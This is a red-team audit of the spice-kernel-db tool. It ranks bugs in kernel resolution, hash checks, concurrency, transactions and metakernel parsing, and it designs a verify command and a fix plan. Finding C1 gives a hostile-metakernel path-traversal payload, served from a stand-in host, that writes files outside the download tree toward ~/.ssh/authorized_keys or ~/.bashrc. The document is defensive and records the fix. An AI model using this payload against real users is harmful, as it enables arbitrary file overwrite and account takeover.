# Red-team architecture audit — findings & plan

**Date:** 2026-05-12
**Scope:** Adversarial review of spice-kernel-db architecture, focused on bugs that can silently load the wrong kernel into SPICE, corrupt the DB, or be exploited by a hostile metakernel.
**Method:** Four parallel adversarial agents (concurrency/atomicity, symlink/filename bridge, content-addressing/resolution, verify+dedup-opt-out design), each reading source and producing ranked findings independently. High convergence across agents on several issues — convergence is taken as a strong signal of reality.

Severity:
- **P0** — silent wrong-kernel into SPICE, security vulnerability, or DB corruption
- **P1** — misleading user, recoverable but real
- **P2** — cosmetic / edge-case

---

## P0 — Critical

### C1 — Path-traversal write-anywhere primitive via hostile metakernel

**Location:** `src/spice_kernel_db/db.py:977` (`_link_existing_kernels`), `src/spice_kernel_db/db.py:1262` (download dest builder in `get_metakernel`).

A `_validate_path_values` guard exists for `PATH_VALUES` (db.py:1108) and `rewrite_metakernel` has a per-entry traversal check (db.py:862-874), **but `_link_existing_kernels` and the download-dest builder in `get_metakernel` have no equivalent check on `relpaths[i]`**.

**Reproduction:** Attacker hosts `evil.tm` with
```
KERNELS_TO_LOAD = ( '$KERNELS/../../../../tmp/pwn.bsp' )
```
User runs `spice-kernel-db get https://evil.example/evil.tm`. `kernel_relpaths()` strips `$KERNELS/` → `'../../../../tmp/pwn.bsp'`. `download_dir / mission / '../../../../tmp/pwn.bsp'` resolves outside the tree; the HTTP body is `open("wb")`-written there. Symlinks can similarly be planted at arbitrary user-writable paths. Worst case targets `~/.ssh/authorized_keys`, `~/.bashrc`.

**Fix:** Single shared validation helper `_safe_join(root, relpath) -> Path | None`. Validate ALL relpaths up-front in `get_metakernel` after `parsed.kernel_relpaths()` is computed. Abort the entire operation if any one entry escapes — never partial.

---

### C2 — Hash-verification gate skipped when canonical filename ≠ requested filename

**Location:** `src/spice_kernel_db/db.py:984-997` (`_link_existing_kernels`).

The Issue-3 hash guard does `SELECT sha256 FROM kernels WHERE filename = filenames[i]`. When `resolve_kernel` legitimately returns a step-3 path-suffix match (the file's canonical name in `kernels` differs from what the .tm asked for — the documented "jup365.bsp ↔ jup365_19900101_20500101.bsp" case), this query returns NULL → `if db_row:` falls through → no hash check → symlink is created blindly.

**Reproduction:** User has scanned `~/junk/jup365.bsp` (mission "unknown", any content). JUICE metakernel asks for `jup365_19900101_20500101.bsp`. Step 1+2 fail; step 3 path-suffix match returns the junk file; canonical-name hash lookup misses; symlink created with no verification. SPICE loads junk content under the canonical JUICE name.

**Fix:** Look up expected hash by the **resolved local path**, not by the requested filename:
```sql
SELECT sha256 FROM locations WHERE abs_path = ?
```
The location row stores the hash (it's the join key). If `sha256_file(local) == that_hash`, the file on disk matches what was registered. Treat `db_row is None` as a hard failure, not a silent pass.

---

### C3 — One filename → many sha256 rows; resolution is non-deterministic

**Location:** `src/spice_kernel_db/db.py:363-384` (`register_file` Issue-11 branch), `db.py:480-488` (`find_by_filename`), `db.py:529-617` (`resolve_kernel`).

The schema permits two `kernels` rows with the same filename but different sha256 (Issue-11 path: "old record preserved" for history). `find_by_filename` returns BOTH; `resolve_kernel` walks them ordered by `l.mission` alphabetically with **no secondary key** → DuckDB ties are resolved arbitrarily.

**Reproduction:** Day 1: scan registers `de440.bsp` with sha=A. Day 2: NAIF ships new `de440.bsp`; `get` triggers Issue-11 branch → inserts row with sha=B. Both rows now live, both have `is_file()` locations. Next `get` of a metakernel referencing `de440.bsp` may resolve to either. The choice can flip across DuckDB versions, VACUUMs, or query plans.

**Fix:** Add `kernels.superseded_by VARCHAR NULL` column. When `register_file` detects hash drift for a filename, set old row's `superseded_by = new_hash`. All resolution queries filter `WHERE k.superseded_by IS NULL`. Old rows remain queryable for forensics. Also add secondary `ORDER BY l.scanned_at DESC, l.abs_path` for deterministic tie-breaking.

---

### C4 — Hash computed AFTER download; corrupted bytes become canonical

**Location:** `src/spice_kernel_db/remote.py:281-299` (`download_kernel`), `db.py:328` (`register_file`).

`download_kernel` validates Content-Length only. Proxy/CDN mangling that preserves byte count (transparent recompression with matching CL header, captive portal injection) goes undetected. `register_file` hashes the corrupted file and stores **that** as truth. `_should_skip_download` then compares disk hash to DB hash — both wrong, both agree — re-download skipped forever.

**Fix:** Where NAIF/ESA publish manifest checksums (`aareadme.txt`, `*.lbl`), fetch and verify before registering. Where unavailable: stream-hash during download and re-fetch a sample range on a second connection.

---

### C5 — `release()/reacquire()` race window detected but not acted on

**Location:** `src/spice_kernel_db/db.py:1180, 1293` (call sites discard return value).

`_check_state_changed` returns True/False but both call sites discard it. Detected concurrent modifications generate a log warning and the process continues writing — producing the C3 scenario more often. Also: `reacquire()` has no retry, so if another process grabbed the write lock during the network I/O window, the next `self.con.execute` hits `AttributeError: 'NoneType'`.

**Fix:** Make `_check_state_changed` raise on conflict. Wrap `reacquire` in bounded retry-with-backoff. Better: hold an OS-level advisory `fcntl.flock` on a sentinel file across the whole `get` so two concurrent `get` processes serialize cleanly.

---

### C6 — No transactions in `register_file`; crash leaves orphan rows

**Location:** `src/spice_kernel_db/db.py:376-394`.

Up to three autocommitted `INSERT`s in sequence (Issue-11 branch: two inserts on `kernels` plus one on `locations`). Power loss / SIGKILL between them leaves a `kernels` row with no `locations`, or a stale row with no active location. `index_metakernel` (db.py:677-683) has the same shape: `DELETE` then N `INSERT`s, no transaction.

**Fix:** Wrap each multi-statement op in explicit `BEGIN`/`COMMIT`. DuckDB supports it.

---

### C7 — Non-atomic file operations (multiple sites)

**Location:** `db.py:879-881` (`rewrite_metakernel`), `db.py:1024-1033` (`_create_metakernel_alias`), `parser.py:164` (`write_metakernel`).

- `rewrite_metakernel`: `unlink()` then `symlink_to()` — TOCTOU window leaves the path missing.
- `_create_metakernel_alias`: same pattern.
- `write_metakernel`: `path.write_text` opens with `O_TRUNC` — concurrent `furnsh` reader can see an empty or truncated .tm. Worst case: SPICE loads an empty metakernel and silently runs with **zero kernels**, returning success.

**Fix:** Standard atomic pattern — `tmp = path.with_suffix(...+".tmp.{uuid}")`, write/symlink to tmp, `fsync`, `os.replace(tmp, path)`. `os.replace` is atomic for both regular files and symlinks within the same directory.

---

### C8 — macOS APFS case-insensitivity vs DuckDB case-sensitive queries

**Location:** `src/spice_kernel_db/db.py:472-488`, `hashing.py:39`.

APFS treats `naif0012.tls` and `NAIF0012.TLS` as the same inode; DuckDB's `WHERE k.filename = ?` is case-sensitive. Two rows can co-exist in `kernels` for what the FS considers one file. `_link_existing_kernels` then sees `expected.exists() == True` (case-insensitive FS), **skips** symlink creation, leaving SPICE pointed at whatever stale target was there from a prior `get`.

**Fix:** Normalize all stored filenames to lowercase (kernel identity is the hash; name casing is metadata). Use `LOWER(k.filename) = LOWER(?)` everywhere. Re-verify target hash when skipping a "pre-existing" symlink.

---

## P1 — High

### H1 — Dangling symlinks never repaired
`db.py:977-979`. Guard `if expected.exists() or expected.is_symlink(): continue` skips dangling links (the case that needs repair). Fix: unlink and recreate dangling links; add `--repair` to `get`.

### H2 — SPICE metakernel parser fragility on legal `.tm` syntax
`parser.py:55-88`. `re.split(r"\\begindata")` splits inside comment blocks. Non-greedy regex truncates on `)` inside quoted strings. `'([^']*)'` ignores SPICE's `''` apostrophe escape. Result: silently truncated KERNELS_TO_LOAD → SPICE loads fewer kernels than declared. Fix: real two-state lexer.

### H3 — `PATH_SYMBOL` prefix collision
`remote.py:222-227`, `parser.py:30-35, 46-52`. If `PATH_SYMBOLS = ('KERNELS', 'KERNELS_DATA')`, `str.replace` order makes `$KERNELS_DATA/...` become `<base>_DATA/...`. Fix: sort symbols by descending length before substitution.

### H4 — Mission name case-normalization inconsistency
`hashing.py:67-86` vs `db.py:262-295`. `guess_mission` returns mixed case; filesystem creates `download_dir/JUICE/` and `download_dir/juice/` as separate dirs. Fix: single `canonicalize_mission()` at every entry point.

### H5 — `task_info` keyed by `dest.name` collides on duplicate basenames
`db.py:1257`. If a .tm references the same basename twice under different relpaths, the second `register_file` attribution gets the wrong `source_url`. Fix: key by full `dest`.

### H6 — Staleness comparison is lexicographic on 16-char timestamp prefix
`db.py:796-799`. Sub-minute updates invisible; same-minute updates falsely flagged as fresh/stale. Fix: parse to `datetime`, compare numerically.

---

## P2 — Medium

- **M1** — `classify_kernel == "unknown"` files (or HTTP error pages with `.bsp` extensions) get registered; no DAF magic-byte validation. *Fix: validate magic bytes before `register_file`.*
- **M2** — `_VERSION_TAG_RE` only matches NAIF format; ESA versioning groups silently collapse. *Fix: per-server regex list.*
- **M3** — `_DIR_LISTING_RE` requires both date and size columns; Apache configs without `FancyIndexing` silently drop entries. *Fix: parse HTML with `html.parser`.*
- **M4** — Dropbox/iCloud/NFS-hosted DB + release/reacquire pattern multiplies conflict-copy risk. *Fix: startup warning if `db_path` is under a known cloud-sync root.*
- **M5** — Version-bump leaves orphan alias registry rows; old versioned `.tm` still resolves with no "superseded" warning. *Fix: explicit `prune` command + `superseded_by` column on metakernel_registry.*
- **M6** — Unicode NFC/NFD mismatch on macOS HFS+/APFS for non-ASCII paths. *Fix: normalize NFC on parse.*

---

## `verify` command — design

### Minimum P0 check-set (must catch — these are the bugs C2/C3/C1 produce)
1. Symlink target's actual sha256 ≠ `kernels.sha256` for that filename.
2. Dangling symlinks.
3. Symlink basename ≠ effective KERNELS_TO_LOAD path (after `$PATH` substitution), case-exact.
4. PATH_VALUES not absolute or not existing.
5. KERNELS_TO_LOAD entries resolving outside `link_root` (path traversal).
6. Multiple `kernels` rows for the same filename — flag ambiguity, don't silently pick.

### P1 should-catch
7. KERNELS_TO_LOAD order preservation (compare to `metakernel_entries.entry_index`).
8. Symlink chain depth > 1 (`os.lstat` at every hop).
9. File size on disk ≠ `kernels.size_bytes` (cheap stat check).
10. Stale `locations` row (file gone).
11. Orphan on disk (file exists, no `locations` row).

### P2 nice-to-have
12. Time-coverage gaps for SPK kernels against user-supplied `[et_start, et_end]`.
13. Case mismatch on case-sensitive FS.
14. Mission attribution mismatch (cross-mission fallback).

### Modes
- `--quick` (default): basename + size + presence + traversal. O(N) stat-only.
- `--deep`: recompute sha256 of every symlink target. O(total kernel size) — multi-GB.
- `--strict`: non-zero exit on any P1+ finding (default: P0 only).

### Output
- Rich table for humans by default.
- `--json` for CI.
- Per-entry status: OK / DANGLING / HASH_MISMATCH / TRAVERSAL / AMBIGUOUS / WRONG_BASENAME / UNRESOLVED.

### Out of scope for v1
- `--repair`: deferred. Don't auto-fix until the user has eyes on verify output.
- Coverage-interval check: needs a user-supplied time window. Add later.

---

## Per-`.tm` dedup opt-out — design questions (NOT YET PLANNED)

**Key insight:** This breaks the content-addressing invariant. Today every `locations` row for a sha256 is fungible; opt-out introduces a "private" tier that isn't. Most queries in `db.py` implicitly assume fungibility.

**Before designing further, the user must answer:**
1. What's the actual motivation?
   - *Reproducibility freeze* → use `chmod -w` + hard-links, not symlinks.
   - *Auditability/provenance* → needs a manifest file (`sha256, source_url, fetched_at`).
   - *SPICE filename-quirk workaround* → per-`.tm` symlink **renaming** is the cheap fix, no copying.

   **Building the wrong one is a 100 GB mistake.**

Other open questions (see redteam output for full list):
- Where does the flag live? `missions`/`metakernel_registry`/`locations`?
- Re-scan behavior: dedupe back, or per-path marker?
- Private tree layout: `download_dir/mission/_private/<mk_filename>/...`?
- Disk-cost prompt must sum **all** kernel sizes for no-dedup.
- Refcount on `remove_metakernel` for shared private copies.
- Conflict precedence between `missions.dedup` and per-`.tm` flag.
- Query audit: every `find_by_filename`, `_find_by_path_suffix`, `resolve_kernel`, `report_duplicates`, `deduplicate_plan`, `stats`, `info_metakernel` needs a policy decision.

---

## Work order

1. ✅ Track findings (this file).
2. ✅ Fix **C1** (traversal — security bug, hostile-.tm write-anywhere).
3. ✅ Fix **C2** (hash gate by resolved path).
4. ✅ Fix **C3** (`superseded_by` column + deterministic resolution).
5. ✅ Build **verify** command around C1+C2+C3.
6. ✅ Fix **C4** (stream-hash during download, plumbed as `expected_hash`).
7. ✅ Fix **C5** (`ConcurrentModificationError` raised on race; `reacquire` retry).
8. ✅ Fix **C6** (BEGIN/COMMIT transactions in `register_file` + `index_metakernel`).
9. ✅ Fix **C7** (atomic `_atomic_write_text` + `_atomic_symlink` helpers; applied at 3 sites).
10. ✅ Fix **C8** (case-insensitive filename queries).
11. ✅ Fix **H1** (dangling symlink repair).
12. ✅ Fix **H2** (proper SPICE .tm lexer — `''` escape, balanced parens, line-start markers).
13. ✅ Fix **H3** (longest `PATH_SYMBOLS` substituted first).
14. ✅ Fix **H4** (`canonicalize_mission()` + startup warning for legacy case-duplicates).
15. ✅ Fix **H5** (`task_info` keyed by full dest path).
16. ✅ Fix **H6** (datetime comparison for staleness, not lexicographic).

Test coverage: 161 → 216 (+55 tests across C1–C8 + H1–H6 + verify).

Remaining: M1–M6 (cosmetic / edge). Not blocking.

## Data-migration notes for existing DBs

- **H4 mission case**: opening a legacy DB with both `JUICE` and `juice`
  rows emits a warning at startup. User must merge manually
  (`mission remove` the wrong-cased one). Going forward, all writes are
  canonicalised so new state stays clean.
- **C3 supersession**: `superseded_by` column is added via
  `ALTER TABLE … ADD COLUMN IF NOT EXISTS` at schema init — auto-migrates.
  Existing legacy "two rows same filename" pairs stay unsuperseded
  (we don't auto-decide which was the "old" version). User can
  re-`get` any .tm to re-trigger detection from the upstream source.
- **H1 dangling symlinks**: next `get`/`update` repairs them automatically.
- **C4 hashes**: pre-existing `kernels.sha256` values were computed
  post-download from disk bytes. If you suspect any are wrong (e.g. you
  were behind a mangling proxy), simply `update <mk>` to re-fetch the
  affected metakernel — the new code stream-hashes during the download
  and verifies if an `expected_hash` is supplied.

For "I only need a few" usage: easiest path is
`spice-kernel-db update <mk>` on each metakernel you actively use.
No bulk data migration required.
